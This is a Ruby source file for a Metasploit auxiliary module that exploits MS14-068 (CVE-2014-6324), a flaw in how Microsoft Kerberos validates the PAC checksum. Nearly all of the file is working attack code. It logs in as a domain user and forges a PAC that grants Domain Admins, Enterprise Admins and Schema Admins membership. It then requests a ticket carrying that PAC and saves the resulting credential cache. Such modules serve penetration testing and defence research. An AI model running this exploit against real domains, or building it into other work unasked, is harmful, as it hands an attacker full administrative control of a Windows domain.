##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::Kerberos::Client

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'MS14-068 Microsoft Kerberos Checksum Validation Vulnerability',
      'Description' => %q{
        This module exploits a vulnerability in the Microsoft Kerberos implementation. The problem
        exists in the verification of the Privilege Attribute Certificate (PAC) from a Kerberos TGS
        request, where a domain user may forge a PAC with arbitrary privileges, including
        Domain Administrator. This module requests a TGT ticket with a forged PAC and exports it to
        a MIT Kerberos Credential Cache file. It can be loaded on Windows systems with the Mimikatz
        help. It has been tested successfully on Windows 2008.
      },
      'Author' =>
        [
          'Tom Maddock', # Vulnerability discovery
          'Sylvain Monne', # pykek framework and exploit
          'juan vazquez' # Metasploit module
        ],
      'References' =>
        [
          ['CVE', '2014-6324'],
          ['MSB', 'MS14-068'],
          ['OSVDB', '114751'],
          ['URL', 'http://blogs.technet.com/b/srd/archive/2014/11/18/additional-information-about-cve-2014-6324.aspx'],
          ['URL', 'https://labs.mwrinfosecurity.com/blog/2014/12/16/digging-into-ms14-068-exploitation-and-defence/'],
          ['URL', 'https://github.com/bidord/pykek'],
          ['URL', 'https://blog.rapid7.com/2014/12/25/12-days-of-haxmas-ms14-068-now-in-metasploit']
        ],
      'License' => MSF_LICENSE,
      'DisclosureDate' => 'Nov 18 2014'
    ))

    register_options(
      [
        OptString.new('USER', [ true, 'The Domain User' ]),
        OptString.new('PASSWORD', [ true, 'The Domain User password' ]),
        OptString.new('DOMAIN', [ true, 'The Domain (upper case) Ex: DEMO.LOCAL' ]),
        OptString.new('USER_SID', [ true, 'The Domain User SID, Ex: S-1-5-21-1755879683-3641577184-3486455962-1000'])
      ])
  end

  def run
    print_status("Validating options...")

    unless datastore['USER_SID'] =~ /^S-(\d+-){6}\d+$/
      print_error("Invalid USER_SID. Ex: S-1-5-21-1755879683-3641577184-3486455962-1000")
      return
    end

    domain = datastore['DOMAIN'].upcase

    print_status("Using domain #{domain}...")

    user_sid_arr = datastore['USER_SID'].split('-')
    domain_sid = user_sid_arr[0, user_sid_arr.length - 1].join('-')
    user_rid = user_sid_arr[user_sid_arr.length - 1].to_i

    unicode_password = Rex::Text.to_unicode(datastore['PASSWORD'])
    password_digest = OpenSSL::Digest.digest('MD4', unicode_password)

    pre_auth = []
    pre_auth << build_as_pa_time_stamp(key: password_digest, etype: Rex::Proto::Kerberos::Crypto::RC4_HMAC)
    pre_auth << build_pa_pac_request
    pre_auth

    print_status("#{peer} - Sending AS-REQ...")
    res = send_request_as(
      client_name: "#{datastore['USER']}",
      server_name: "krbtgt/#{domain}",
      realm: "#{domain}",
      key: password_digest,
      pa_data: pre_auth
    )

    unless res.msg_type == Rex::Proto::Kerberos::Model::AS_REP
      print_warning("#{peer} - #{warn_error(res)}") if res.msg_type == Rex::Proto::Kerberos::Model::KRB_ERROR
      print_error("#{peer} - Invalid AS-REP, aborting...")
      return
    end

    print_status("#{peer} - Parsing AS-REP...")

    session_key = extract_session_key(res, password_digest)
    logon_time = extract_logon_time(res, password_digest)
    ticket = res.ticket

    pre_auth = []
    pre_auth << build_pa_pac_request

    groups = [
      513, # DOMAIN_USERS
      512, # DOMAIN_ADMINS
      520, # GROUP_POLICY_CREATOR_OWNERS
      518, # SCHEMA_ADMINISTRATORS
      519  # ENTERPRISE_ADMINS
    ]

    pac = build_pac(
      client_name: datastore['USER'],
      group_ids: groups,
      domain_id: domain_sid,
      user_id: user_rid,
      realm: domain,
      logon_time: logon_time,
      checksum_type: Rex::Proto::Kerberos::Crypto::RSA_MD5
    )

    auth_data = build_pac_authorization_data(pac: pac)
    sub_key = build_subkey(subkey_type: Rex::Proto::Kerberos::Crypto::RC4_HMAC)

    print_status("#{peer} - Sending TGS-REQ...")

    res = send_request_tgs(
      client_name: datastore['USER'],
      server_name: "krbtgt/#{domain}",
      realm: domain,
      session_key: session_key,
      ticket: ticket,
      auth_data: auth_data,
      pa_data: pre_auth,
      subkey: sub_key
    )

    unless res.msg_type == Rex::Proto::Kerberos::Model::TGS_REP
      print_warning("#{peer} - #{warn_error(res)}") if res.msg_type == Rex::Proto::Kerberos::Model::KRB_ERROR
      print_error("#{peer} - Invalid TGS-REP, aborting...")
      return
    end

    print_good("#{peer} - Valid TGS-Response, extracting credentials...")

    cache = extract_kerb_creds(res, sub_key.value)

    path = store_loot('windows.kerberos', 'application/octet-stream', rhost, cache.encode)
    print_good("#{peer} - MIT Credential Cache saved on #{path}")
  end

  def warn_error(res)
    msg = ''

    if Rex::Proto::Kerberos::Model::ERROR_CODES.has_key?(res.error_code)
      error_info = Rex::Proto::Kerberos::Model::ERROR_CODES[res.error_code]
      msg = "#{error_info[0]} - #{error_info[1]}"
    else
      msg = 'Unknown error'
    end

    msg
  end
end

